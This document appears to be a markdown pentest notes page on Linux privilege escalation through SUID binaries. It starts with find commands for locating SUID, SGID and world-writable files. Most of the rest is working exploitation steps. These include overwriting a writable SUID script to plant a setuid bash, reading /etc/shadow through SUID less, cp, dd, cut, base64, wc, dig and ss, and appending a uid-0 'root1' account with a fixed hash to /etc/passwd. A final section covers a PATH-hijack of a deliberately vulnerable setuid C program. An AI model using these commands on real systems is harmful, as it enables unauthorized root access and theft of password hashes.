

# Privilege Escalation via SUID

### Finds Files and Directories with Special Permissions

###### - Finds all files and directories with permissions set to 777 (read, write, execute for owner, group, and others )
```bash
find / -perm 777 -type f 2>/dev/null  # apart of -type f we can also use -type d (for directories)
```

###### - Finds directories with permissions 1777 (world-writable with the sticky bit set)
```bash
find / -perm 1777 -type d 2>/dev/null
```

###### - Finds files and directories  writable by others 
```bash
find / -perm -o=w -type f 2>/dev/null # we can change type and permission like below
# -type d  or  -type -f 
# -o=wr or -o=rwx or -o=rw
#replacing -type and permition make combinations 

#eg. find / -perm -o=[permissions] -type [d for directory or f for file] 2>/dev/null 
```

###### - Finds Directories and files which have writable permission
```bash
find / -writable -type d 2>/dev/null # use for find writable directories
find / -writable -type f 2>/dev/null # use for find writable files
```

###### - Finds readable directories and files
```bash
find / -readable -type f 2>/dev/null  # behalf of -type f we can use -type d for readable directories 
```

###### - Find specific file using -name
```bash
find / -type f -name httpd.conf 2>/dev/null 
# here apart of httpd.conf we can use file name which we want to find 
```


### SUID/SGID
**SUID Files** : *SUID files can be a security risk if misconfigured or vulnerable, as they allow execution with elevated privileges. A common example is /usr/bin/passwd, which allows users to change their password with root privileges temporarily.*

**SGID Directories :** *SGID directories ensure that new files created within inherit the group ownership of the directory, which can be useful in collaborative invironments. However, improper settings can lead to security issues, especially if sensitive files are created or accessed inappropriately.*

###### - Finds files (-type f) with the SUID (Set User ID) bit set (-perm -u=s). The SUID bit allows a file to be executed with the privileges of the file's owner, which is often root, regardless of the user running it. 
```bash
find / -type f -perm -u=s 2>/dev/null
```

###### - Similar to the previous command but explicitly looks for files with read (r), write (w) and SUID (s) permissions set for the owner.
```bash
find / -type f -perm -u=rws 2>/dev/null
```

###### - Another way to find SUID files using the octal representation of the SUID bit (04000).
```bash
find / -type f -perm 04000 2>/dev/null
```

###### - Finds directories (-type d) with the SGID (Set Group ID) bit set (-g=rws). The SGID bit on a directory means files created withing it will inherit the directory's group, not the user's primary group.
```bash
find / -type d -perm -g=rws 2>/dev/null
find / -type f -perm -g=rws 2>/dev/null
```

###### - Finds directories with group read (r), write (w), and SGID (S) permissions. The capital S indicates that the execute bit is not set for the group, but the SGID bit is set.
```bash
find / -type d -perm -g=rwS 2>/dev/null
find / -type f -perm -g=rwS 2>/dev/null
```

###### - Finds directories with both the SUID and SGID bits set using octal notation (06000).
```bash
find / -type d -perm -06000 2>/dev/null
```

### ✅ **Secure SUID Binaries That Do Not Lead to Privilege Escalation**

Not all SUID binaries are dangerous. Some are designed to run as **root** but are implemented securely, ensuring that they **do not allow arbitrary command execution or privilege escalation**.

---
#### List of Secure SUID Binaries in Linux

##### These are common SUID binaries found in Linux systems that are generally considered safe:
| **Binary**               | **Path**                         | **Purpose**                              | **Reason It's Secure**  |
|--------------------------|---------------------------------|------------------------------------------|-------------------------|
| `passwd`                 | `/usr/bin/passwd`               | Changes user passwords                   | Modifies only the user's entry in `/etc/shadow`, requiring authentication. |
| `sudo`                   | `/usr/bin/sudo`                 | Runs commands as another user            | Requires user authentication and logs all executions. |
| `mount`                  | `/usr/bin/mount`                | Mounts filesystems                       | Can only mount predefined filesystems in `/etc/fstab`. |
| `umount`                 | `/usr/bin/umount`               | Unmounts filesystems                     | Can only unmount mounted filesystems. |
| `crontab`                | `/usr/bin/crontab`              | Manages cron jobs                        | Only allows modifying the user's own cron jobs. |
| `chsh`                   | `/usr/bin/chsh`                 | Changes user shell                       | Enforces strict validation to prevent abuse. |
| `chfn`                   | `/usr/bin/chfn`                 | Changes user information                 | Enforces validation, preventing arbitrary command execution. |
| `at`                     | `/usr/bin/at`                   | Schedules tasks                          | Executes scheduled jobs only with user permissions. |
| `newgrp`                 | `/usr/bin/newgrp`               | Changes active group                     | Only affects the current shell session. |
| `pkexec`                 | `/usr/sbin/pkexec`              | Runs commands as another user            | Enforces authentication before running commands. |
| `traceroute6.iputils`     | `/usr/bin/traceroute6.iputils`  | Performs network diagnostics             | Only executes predefined system calls, not arbitrary commands. |
| `gpasswd`                | `/usr/bin/gpasswd`              | Manages group passwords                  | Requires authentication and prevents command injection. |
| `fusermount`             | `/bin/fusermount`               | Mounts FUSE filesystems                  | Only allows user-space filesystem mounting. |
| `Xorg.wrap`              | `/usr/bin/Xorg.wrap`            | Runs X server                            | Restricts execution to non-root users, preventing privilege escalation. |
| `ping`                   | `/usr/bin/ping`                 | Sends ICMP echo requests                 | Only allows sending controlled network packets. |




### Privilege Escalation via SUID

SUID (SET User ID) files run with the permissions of the file owner, which is often the root user. if a SUID executable is vulnerable or misconfigured, it can be exploitaed to escalate privileges.

#### Steps to Identify and Exploit SUID Files 
##### 1. Find SUID Files :
```bash 
find / -type f -perm -u=s 2>dev/null
```

##### 2. Anylyze SUID Files :
- Check the purpose of the SUID file.
 ```bash
   find / -type f -perm -u=rws 2>/dev/null
 ```
- Determine if the file is writable or vulnerable.
##### 3. Exploitation Scenarios :
###### 3.1 Misconfigured SUID Binaries : if a binary is writable, it can be replaced with a malicious script or binary.
```bash
find / -type f -perm -u=rws,o=rw 2>/dev/null 
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/to/suid-binary   # if suid has writable permission
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/NX/scripts/restricted/nxlicense.sh
cat /usr/NX/scripts/restricted/nxlicense.sh    # verifying contain is write or not
./usr/NX/scripts/restricted/nxlicense.sh   # run the binary
#After execution , run /tmp/bash -p to get a root shell.
/tmp/bash -p 
```


#### 4 exploitation of  suid binaries 
</br>
</br>

###### 4.1 privilege escalation via find suid binary
check suid permissions
```bash
which find
ls -lha /usr/bin/find
```

![](Attachments/Pasted%20image%2020250222092813.png)

check user id 
```bash
id
```

![](Attachments/Pasted%20image%2020250222092933.png)

exploit binary

![](Attachments/Pasted%20image%2020250222093108.png)

check privilege 
```bash
id
```

![](Attachments/Pasted%20image%2020250222093237.png)

now we have root privileges 

for account takeover you can read /etc/shadow then crack this hash

```bash
cat /etc/shadow
```

![](Attachments/Pasted%20image%2020250222094208.png)

---

###### 4.2 vim /vi/nano
check permissions
```
which vim
ls -lha /usr/bin/vim
```

![](Attachments/Pasted%20image%2020250222103207.png)

edit the passwd file or edit the shadow file 
```bash
vim /etc/passwd 

#add below line 
root1:$1$NBIvZax5$jv3IXEGcWtVxsfayNTv9B0:0:0:root:/root:/bin/bash
```

**Note :- when you are trying to save this file it will give error so for save file use *wq!*** 

```bash
vim /etc/shadow

#Replace the root hash with your intended password hash ( openssh passwd 1234 )
```

![](Attachments/Pasted%20image%2020250222104135.png)

**Note :- when you are trying to save this file it will give error so for save file use *wq!***

---

###### 4.3 less / more 
check the permissions 
```
which less
ls -lha 
```

![](Attachments/Pasted%20image%2020250222104754.png)

using suid less /more we can read sensitive files 
```bash
less /etc/shadow 
```

![](Attachments/Pasted%20image%2020250222105244.png)

---

###### 4.4 cp 
check the permissions
```bash
which cp
ls -lha /usr/bin/cp
```

copy the /etc/shadow file into users home directory 
Then read file you will get password hash
then crack the password hash using password cracking tool

```bash
cp /etc/shadow /home/bob/shadow
cat /home/bob/shadow
```

When you found suid on cp binary the don't cp /etc/passwd file on /tmp location copy it into users home directory 

Or After copy /etc/passwd  or /etc/shadow file you can edit it and 
Then again using cp command replace with original file 

---

###### 4.5  file , date 
check permissions 
```bash
which file
ls -lha /usr/bin/file
```

Read the /etc/shadow file copy the password hash and crack 

```bash
file -f /etc/shadow
```

---

###### 4.6 dd
check permissions

copy the /etc/passwd file using dd

```bash
dd if=/etc/passwd of=/tmp/passwd
```

edit the copied file and add new user inforamation

```bash
vim /etc/passwd

#add root1:$1$NBIvZax5$jv3IXEGcWtVxsfayNTv9B0:0:0:root:/root:/bin/bash line into /tmp/passwd
```

Then Replace the edited file with original /etc/passwd

```bash
dd if=/tmp/passwd of=/etc/passwd
```

Then login with new added user 

```bash
su root
```

---

###### 4.7 cut
check permissions

Then read the /etc/shadow file and then crack the password hash

```bash
cut -f1- -d: /etc/shadow 
```

---

###### 4.8 base64
check permissions

encode the /etc/shadow and then decode it using base64

```bash
base64 /etc/shadow | base64 --decode 
```

your will get password hash

---

###### 4.9 wc
check permissions 

Then read /etc/shadow file 

```bash
wc --files0-from=/etc/shadow 
```

grep password of hash and crack it

---

###### 4.10 dig

check permissions 

Read /etc/shadow file 
```bash
dig -f /etc/shadow 
```

---

###### 4.11 ss

read /etc/shadow
```bash
ss -a -F /etc/shadow 
```

It will read only one line 

---

###### 4.12 tee
edit file using tee
```bash
echo 'root1:$1$NBIvZax5$jv3IXEGcWtVxsfayNTv9B0:0:0:root:/root:/bin/bash' | tee -a /etc/passwd 
```

It will append the provided contain into /etc/passwd file 


---

### Custom binary
#### 1. make custom binary

```c title:user_id.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
	
	setuid(0);
	setgid(0);

	system("whoami");

	return 0;
}
```

#### 2. Compiling and Setting SUID Bit

##### 2.1 Compile the binary
```bash title:user_id
gcc -o user_id user_id.c
```

Above command will compile the program into an executable called user_id

##### 2.2 Set the SUID bit 
```bash
chmod u+s user_id
```

After assign SUID binary will run as owner's (root's)  privileges

##### 2.3 Change ownership to root
```bash
chown root:root user_id
```


##### 2.4 Verify SUID bit 
```bash
ls -l user_id
```

![](Attachments/Pasted%20image%2020250222215643.png)

The s in rwsr-xr-x indicates the SUID bit is set

#### 3. Exploiting the SUID Binary for Privilege Escalation
##### 3.1 Check the custom binary permissions
```bash
ls -lha /usr/local/bin/user_id 
```

output 
![](Attachments/Pasted%20image%2020250222215643.png)

We can see the binary has been set SUID and Owner is root mean that this binary will run with root's power

##### 3.2 Run the binary and observe the output 
```
/usr/local/bin/user_id 
```

output 
![](Attachments/Pasted%20image%2020250222220522.png)

##### 3.3 Analyze the user_id binary
Check the file type 

```
file /usr/local/bin/user_id 
```

output 
![](Attachments/Pasted%20image%2020250222220736.png)

Analyze the user_id binary strings

```bash
strings /usr/local/bin/user_id
```

output
![](Attachments/Pasted%20image%2020250222221205.png)

The binary is use whoami in user_id 


##### 4 Check path variable and whoami binary
```bash
echo $PATH
```

output
![](Attachments/Pasted%20image%2020250222221516.png)

mean first whoami binary will check in /usr/local/sbin then /usr/local/bin like that 

let's check first is whoami binary available in /usr/local/sbin location
```
ls -lha /usr/local/sbin
```

output
![](Attachments/Pasted%20image%2020250222223913.png)

here we can see there is no whoami binary available in /usr/local/sbin  

check /usr/local permission 
```
ls -lha /usr/local 
```

output
![](Attachments/Pasted%20image%2020250222224144.png)

we can see /usr/local/bin or /usr/local/sbin has not write permission for other user 

then find writable directory 

##### 5 PATH manipulation / hijacking
we know that we can write any file into home and /tmp directory
so we will add this directory into PATH
###### Add PATH into PATH variable 
```bash
export PATH=/tmp:$PATH
```

then check PATH is added or not 
![](Attachments/Pasted%20image%2020250222225405.png)

we can see /tmp path has been added 

##### 6 create whoami binary into /tmp 
```
vim whoami 

#!/bin/bash

/bin/bash 

add this content into binary/script 
```

![](Attachments/Pasted%20image%2020250222225847.png)

Then assign executable permission for /tmp/whoami 

```bash
chmod 755 /tmp/whoami
```

![](Attachments/Pasted%20image%2020250222230012.png)

##### Run custom binary 
```
/usr/local/bin/user_id 
```

![](Attachments/Pasted%20image%2020250222230304.png)

You can see we got root access.





